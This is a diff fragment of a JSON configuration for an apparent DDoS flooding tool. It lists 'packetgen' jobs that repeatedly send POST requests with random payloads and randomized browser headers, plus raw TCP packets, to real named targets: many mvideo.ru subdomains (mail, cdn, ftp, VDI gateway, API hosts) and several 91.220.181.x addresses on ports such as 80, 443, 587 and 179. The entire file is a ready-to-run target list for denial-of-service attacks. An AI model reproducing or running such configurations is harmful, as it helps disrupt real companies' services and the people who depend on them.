+                                "Origin": "http://91.220.181.237",
+                                "Referer": "http://91.220.181.237",
+                                "X-Forwarded-Host": "91.220.181.237",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.219:2001",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.219:2001"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://pm-sb-port.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "pm-sb-port.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://pm-sb-port.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://pm-sb-port.mvideo.ru",
+                                "Referer": "http://pm-sb-port.mvideo.ru",
+                                "X-Forwarded-Host": "pm-sb-port.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://vdi-uag.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "vdi-uag.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://vdi-uag.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://vdi-uag.mvideo.ru",
+                                "Referer": "https://vdi-uag.mvideo.ru",
+                                "X-Forwarded-Host": "vdi-uag.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://91.220.181.227",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.227:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://91.220.181.227",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://91.220.181.227",
+                                "Referer": "https://91.220.181.227",
+                                "X-Forwarded-Host": "91.220.181.227",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://webapi-pilot.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "webapi-pilot.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://webapi-pilot.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://webapi-pilot.mvideo.ru",
+                                "Referer": "http://webapi-pilot.mvideo.ru",
+                                "X-Forwarded-Host": "webapi-pilot.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://mail.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "mail.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://mail.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://mail.mvideo.ru",
+                                "Referer": "https://mail.mvideo.ru",
+                                "X-Forwarded-Host": "mail.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.87",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.87:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.87",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.87",
+                                "Referer": "http://91.220.181.87",
+                                "X-Forwarded-Host": "91.220.181.87",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.80:587",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.80:587"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://tm-qas.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "tm-qas.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://tm-qas.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://tm-qas.mvideo.ru",
+                                "Referer": "http://tm-qas.mvideo.ru",
+                                "X-Forwarded-Host": "tm-qas.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://cdn.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "cdn.mvideo.ru:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://cdn.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://cdn.mvideo.ru",
+                                "Referer": "http://cdn.mvideo.ru",
+                                "X-Forwarded-Host": "cdn.mvideo.ru",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "tcp://91.220.181.207:179",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.207:179"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "http://91.220.181.31",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "91.220.181.31:80"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "http://91.220.181.31",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "http://91.220.181.31",
+                                "Referer": "http://91.220.181.31",
+                                "X-Forwarded-Host": "91.220.181.31",
+                                "User-Agent": "{{ random_user_agent }}"
+                            },
+                            "body": "{{ random_payload 1000 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 10,
+            "name": "https://ftp.mvideo.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "ftp.mvideo.ru:443",
+                        "tls_config": {
+                            "insecure_skip_verify": true
+                        }
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "http",
+                        "data": {
+                            "method": "POST",
+                            "path": "https://ftp.mvideo.ru",
+                            "headers": {
+                                "Accept": "*/*",
+                                "Accept-Encoding": "gzip, deflate, br",
+                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
+                                "Cache-Control": "max-age=0",
+                                "Connection": "Keep-Alive",
+                                "Sec-Fetch-Dest": "document",
+                                "Sec-Fetch-Mode": "navigate",
+                                "Sec-Fetch-Site": "same-origin",
+                                "Sec-Fetch-User": "?1",
+                                "Pragma": "no-cache",
+                                "Upgrade-Insecure-Requests": "1",
+                                "Origin": "https://ftp.mvideo.ru",
+                                "Referer": "https://ftp.mvideo.ru",
+                                "X-Forwarded-Host": "ftp.mvideo.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
